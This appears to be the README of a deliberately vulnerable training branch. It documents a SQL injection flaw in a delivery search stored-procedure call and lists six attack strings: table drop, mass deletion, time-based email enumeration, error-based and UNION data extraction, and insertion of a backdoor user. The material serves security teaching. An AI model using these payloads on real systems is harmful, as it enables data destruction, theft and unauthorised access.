# SQL Injection Vulnerability

## Overview

Branch: vulnerability/sql-injection

This branch demonstrates a **SQL Injection** vulnerability in the delivery search functionality. The vulnerability exists in `DeliveryStore.SearchByCargoDescriptionSproc()` where user input is directly concatenated into a SQL command string without proper parameterization.

## Attack Samples

### 1. Table Destruction (Requires DDL Permissions)

**Attack String:**

```
'; DROP TABLE Deliveries; --
```

**Resulting SQL:**

```sql
EXEC SearchDeliveriesByCargoDescription '...', ''; DROP TABLE Deliveries; --', 0, 20
```

**Impact:** Destroys the Deliveries table completely. Note: This may fail if the SQL Server account lacks DDL permissions (which is common in production).

---

### 2. Data Deletion (DML Attack)

**Attack String:**

```
'; DELETE FROM Deliveries WHERE 1=1; --
```

**Resulting SQL:**

```sql
EXEC SearchDeliveriesByCargoDescription '...', ''; DELETE FROM Deliveries WHERE 1=1; --', 0, 20
```

**Impact:** Deletes all delivery records. More likely to succeed than DDL attacks since the application typically has DML permissions.


---

### 3. Time-Based Blind SQL Injection - Email Enumeration

**Attack String (Check if admin@example.com exists):**

```
test', 0, 20; IF EXISTS(SELECT 1 FROM AspNetUsers WHERE Email='admin@example.com') WAITFOR DELAY '00:00:03'; --
```

**How it works:**
- If the email doesn't exist, the query completes quickly
- By measuring response time, an attacker can enumerate valid email addresses
- Note: the stored procedure actually runs, so no errors get logged.

**Simpler timing attack:**

```
test', 0, 20; WAITFOR DELAY '00:00:05'; --
```

**Impact:** Causes a 5-second delay, proving SQL injection exists. This is often the first step attackers take to confirm vulnerability.

---

### 4. Data Exfiltration via Error Messages

**Attack String:**

```
' AND 1=CAST((SELECT TOP 1 Email FROM AspNetUsers) AS INT); --
```

**Impact:** Forces SQL Server to convert an email string to an integer, causing an error message that contains the email address. If error messages are displayed to users, this reveals sensitive data.

---



### 5. Union-Based Data Extraction

**Attack String:**

```
' UNION SELECT Id, NULL, NULL, NULL, NULL, NULL, Email, NULL, NULL, NULL, 0, GETDATE(), GETDATE() FROM AspNetUsers; --
```

**Impact:** Appends user email addresses to the search results. Requires knowledge of column count and types, but attackers can discover this through trial and error.

---

### 6. Stacked Queries - Creating Backdoor

**Attack String:**

```
cargo', 0, 20; INSERT INTO AspNetUsers (Email, UserName, NormalizedEmail, NormalizedUserName) VALUES ('hacker@evil.com', 'hacker', 'HACKER@EVIL.COM', 'HACKER'); --
```

**Impact:** Injects a new user account for persistent access.


## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments.
